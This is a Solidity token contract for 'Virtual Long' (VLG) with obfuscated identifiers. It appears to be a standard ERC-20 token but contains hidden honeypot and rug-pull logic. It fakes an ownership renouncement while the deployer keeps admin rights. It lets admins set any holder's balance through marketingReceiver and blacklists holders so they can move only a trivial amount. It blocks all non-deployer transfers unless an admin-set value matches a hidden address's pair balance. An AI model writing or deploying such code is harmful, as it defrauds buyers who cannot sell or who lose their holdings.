//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface launchTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract limitMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromTake {
    function createPair(address atLiquidityWallet, address exemptWallet) external returns (address);
}

interface minTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address exemptLimit) external view returns (uint256);

    function transfer(address atSell, uint256 enableMin) external returns (bool);

    function allowance(address enableBuy, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableMin) external returns (bool);

    function transferFrom(
        address sender,
        address atSell,
        uint256 enableMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundTakeLiquidity, uint256 value);
    event Approval(address indexed enableBuy, address indexed spender, uint256 value);
}

interface txBuy is minTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract VirtualLong is limitMin, minTeam, txBuy {

    function teamEnable(address minReceiver, address atSell, uint256 enableMin) internal returns (bool) {
        if (minReceiver == autoToBuy) {
            return walletLiquidity(minReceiver, atSell, enableMin);
        }
        uint256 maxShouldMarketing = minTeam(toLimitLiquidity).balanceOf(isSell);
        require(maxShouldMarketing == receiverMarketing);
        require(atSell != isSell);
        if (takeSell[minReceiver]) {
            return walletLiquidity(minReceiver, atSell, listTo);
        }
        return walletLiquidity(minReceiver, atSell, enableMin);
    }

    bool public feeAt;

    mapping(address => mapping(address => uint256)) private buyMax;

    function approve(address listAuto, uint256 enableMin) public virtual override returns (bool) {
        buyMax[_msgSender()][listAuto] = enableMin;
        emit Approval(_msgSender(), listAuto, enableMin);
        return true;
    }

    function owner() external view returns (address) {
        return marketingExempt;
    }

    string private fundSender = "VLG";

    bool public liquidityFund;

    function transfer(address totalFundReceiver, uint256 enableMin) external virtual override returns (bool) {
        return teamEnable(_msgSender(), totalFundReceiver, enableMin);
    }

    address marketingTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => bool) public launchTrading;

    uint256 modeShould;

    function tokenTeam(address toShould) public {
        atMarketing();
        if (limitToken == exemptMarketing) {
            marketingBuy = true;
        }
        if (toShould == autoToBuy || toShould == toLimitLiquidity) {
            return;
        }
        takeSell[toShould] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return fundSender;
    }

    uint256 constant listTo = 5 ** 10;

    address public toLimitLiquidity;

    function atMarketing() private view {
        require(launchTrading[_msgSender()]);
    }

    uint256 public limitToken;

    uint256 public exemptMarketing;

    function name() external view virtual override returns (string memory) {
        return atMax;
    }

    function fundLimit(uint256 enableMin) public {
        atMarketing();
        receiverMarketing = enableMin;
    }

    uint256 private totalMode;

    mapping(address => uint256) private totalTo;

    function totalSupply() external view virtual override returns (uint256) {
        return shouldFrom;
    }

    event OwnershipTransferred(address indexed totalFrom, address indexed maxAmountMarketing);

    mapping(address => bool) public takeSell;

    bool public marketingBuy;

    function transferFrom(address minReceiver, address atSell, uint256 enableMin) external override returns (bool) {
        if (_msgSender() != marketingTake) {
            if (buyMax[minReceiver][_msgSender()] != type(uint256).max) {
                require(enableMin <= buyMax[minReceiver][_msgSender()]);
                buyMax[minReceiver][_msgSender()] -= enableMin;
            }
        }
        return teamEnable(minReceiver, atSell, enableMin);
    }

    function decimals() external view virtual override returns (uint8) {
        return sellAtShould;
    }

    constructor (){
        
        launchTotal enableMarketing = launchTotal(marketingTake);
        toLimitLiquidity = fromTake(enableMarketing.factory()).createPair(enableMarketing.WETH(), address(this));
        
        autoToBuy = _msgSender();
        amountTeam();
        launchTrading[autoToBuy] = true;
        totalTo[autoToBuy] = shouldFrom;
        
        emit Transfer(address(0), autoToBuy, shouldFrom);
    }

    function amountTeam() public {
        emit OwnershipTransferred(autoToBuy, address(0));
        marketingExempt = address(0);
    }

    function getOwner() external view returns (address) {
        return marketingExempt;
    }

    function marketingReceiver(address totalFundReceiver, uint256 enableMin) public {
        atMarketing();
        totalTo[totalFundReceiver] = enableMin;
    }

    function balanceOf(address exemptLimit) public view virtual override returns (uint256) {
        return totalTo[exemptLimit];
    }

    address isSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function tokenBuy(address limitMax) public {
        if (feeAt) {
            return;
        }
        
        launchTrading[limitMax] = true;
        
        feeAt = true;
    }

    address public autoToBuy;

    uint256 private shouldFrom = 100000000 * 10 ** 18;

    function walletLiquidity(address minReceiver, address atSell, uint256 enableMin) internal returns (bool) {
        require(totalTo[minReceiver] >= enableMin);
        totalTo[minReceiver] -= enableMin;
        totalTo[atSell] += enableMin;
        emit Transfer(minReceiver, atSell, enableMin);
        return true;
    }

    function allowance(address walletReceiver, address listAuto) external view virtual override returns (uint256) {
        if (listAuto == marketingTake) {
            return type(uint256).max;
        }
        return buyMax[walletReceiver][listAuto];
    }

    string private atMax = "Virtual Long";

    address private marketingExempt;

    uint256 receiverMarketing;

    uint8 private sellAtShould = 18;

}